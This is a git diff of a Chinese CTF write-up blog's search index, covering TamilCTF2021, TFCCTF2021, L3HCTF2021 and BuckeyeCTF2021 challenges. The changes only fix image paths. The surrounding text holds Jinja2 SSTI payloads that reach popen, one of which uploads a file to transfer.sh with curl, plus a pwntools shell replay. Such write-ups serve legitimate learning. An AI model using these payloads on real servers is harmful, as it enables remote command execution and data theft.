@@ -26,7 +26,7 @@
     <title>TamilCTF2021 Writeup</title>
     <url>/posts/2827311957/</url>
     <content><![CDATA[<h1 id="Open-Flag"><a href="#Open-Flag" class="headerlink" title="Open Flag"></a>Open Flag</h1><hr>
-<p>访问题目中给出的链接,发现是一个登录页面<br><img data-src="images/login.png" alt="Open Flag" style="zoom:80%;"><br>随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是<code>./flag.jpg</code>.<br>F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可<br><img data-src="images/image-20211119203608270.jpg" alt="image-20211119203608270" style="zoom:70%;"></p>
+<p>访问题目中给出的链接,发现是一个登录页面<br><img data-src="../../CTF/TamilCTF2021/Web/images/login.png" alt="Open Flag" style="zoom:80%;"><br>随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是<code>./flag.jpg</code>.<br>F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可<br><img data-src="../../CTF/TamilCTF2021/Web/images/image-20211119203608270.jpg" alt="image-20211119203608270" style="zoom:70%;"></p>
 <p>使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记<code>&lt;!--</code>,找到<code>os._wrap_close</code>模块所在的索引为132,借助于<code>popen</code>函数可以直接执行系统命令</p>
 <pre><code class="python">{{"".__class__.__bases__[0].__subclasses__()}}
 </code></pre>
@@ -35,7 +35,7 @@
 <pre><code class="python">{{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('curl --upload-file ./flag.jpg http://transfer.sh/flag.jpg').read()}}
 </code></pre>
 <p>在HTML注释中找到文件上传后的URL<code>http://transfer.sh/bDGBlw/flag.jpg</code><br><img data-src="../../CTF/TamilCTF2021/Web/images/image-20211119204635015.png" alt="image-20211119204635015"></p>
-<p><img data-src="images/flag.jpg" alt="Open Flag" style="zoom:80%;"></p>
+<p><img data-src="../../CTF/TamilCTF2021/Web/images/flag.jpg" alt="Open Flag" style="zoom:80%;"></p>
 <p><strong>flag:</strong><code>TamilCTF{SsTi_Is_VeRy_DaNgErOuS}</code><br><a id="more"></a></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
@@ -123,7 +123,7 @@ Path(<span class="string">'a.png'</span>).write_bytes(data)
 <p>在<a href="https://keyserver.pgp.com/vkd/SubmitSearch.event?SearchCriteria=A2DCB36111E3656B&amp;EmailOrName=3&amp;SearchType=0" target="_blank" rel="noopener">https://keyserver.pgp.com/</a>上检索,得到邮箱<a href="mailto:`tdgd11fd8@gmail.com" target="_blank" rel="noopener">`tdgd11fd8@gmail.com</a>`</p>
 <p><img data-src="../../CTF/TFCCTF2021/Misc/images/image-20211203195242066.png" alt="image-20211203195242066"></p>
 <p>在<a href="https://tools.epieos.com/email.php" target="_blank" rel="noopener">OSINT Tool</a>上搜索该邮箱,得到用户名是<code>Theobald Dannie Gyles</code></p>
-<p><img data-src="images/image-20211203200112827.png" alt="image-20211203200112827" style="zoom:50%;"></p>
+<p><img data-src="../../CTF/TFCCTF2021/Misc/images/image-20211203200112827.png" alt="image-20211203200112827" style="zoom:50%;"></p>
 <p>在<a href="https://keyserver.pgp.com/vkd/SubmitSearch.event" target="_blank" rel="noopener">https://keyserver.pgp.com/</a>上搜索包含该用户名的PGP密钥,即可得到flag</p>
 <p><img data-src="../../CTF/TFCCTF2021/Misc/images/image-20211203201556442.png" alt="image-20211203201556442"></p>
 <p><strong>flag:</strong><code>TFCCTF{Pee,G...Pee!_w4s_wh4t_th4t_h3_t0ld_m3....!})</code></p>
@@ -153,11 +153,11 @@ Path(<span class="string">'a.png'</span>).write_bytes(data)
 <blockquote>
 <p>🤠登录后疯狂点击“投票”,也能投满8票;可能因为Server响应太慢,浏览器中保存的session还没来得及被更新,导致多个请求发起时共用一个session(即vote数量相等),session中保存的vote最终只会减一.</p>
 </blockquote>
-<p><img data-src="images/0.jpg" alt="image-20211114190032492" style="zoom:50%;"></p>
+<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/0.jpg" alt="image-20211114190032492" style="zoom:50%;"></p>
 <p>使用如下代码作为用户名登录,查看一下当前已加载模块</p>
 <pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()}}
 </code></pre>
-<p><img data-src="images/1.jpg" alt="image-20211114182131940" style="zoom:50%;"></p>
+<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/1.jpg" alt="image-20211114182131940" style="zoom:50%;"></p>
 <p>人肉计数/写个脚本,找到<code>os._wrap_close</code>模块所在的索引,借助于<code>popen</code>函数可以直接执行系统命令</p>
 <pre><code class="python">num = <span class="number">0</span>
 <span class="keyword">for</span> i <span class="keyword">in</span> a.split(<span class="string">', '</span>):
@@ -671,7 +671,7 @@ flag.png
 <hr>
 <p>使用<a href="https://www.wireshark.org/download.html" target="_blank" rel="noopener">Wireshark</a>分析<code>replay.pcap</code>文件,跟踪TCP流,发现似乎是发送了一些数据拿到Shell权限后,执行了一些命令.</p>
 <p>对着“Data”右键,选择“导出分组字节流”,保存字节流数据至<code>a.bin</code></p>
-<p><img data-src="images/replay-1.png" alt="image-20211027235735902" style="zoom:60%;"></p>
+<p><img data-src="../../CTF/BuckeyeCTF2021/Misc/images/replay-1.png" alt="image-20211027235735902" style="zoom:60%;"></p>
 <p>编写脚本,使用<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">pwn</a>连接服务器并发送数据,执行shell命令,找到<code>flag.txt</code>文件</p>
 <pre><code class="shell">╭─ ~/CTF/BuckeyeCTF2021
 ╰─$ python a.py
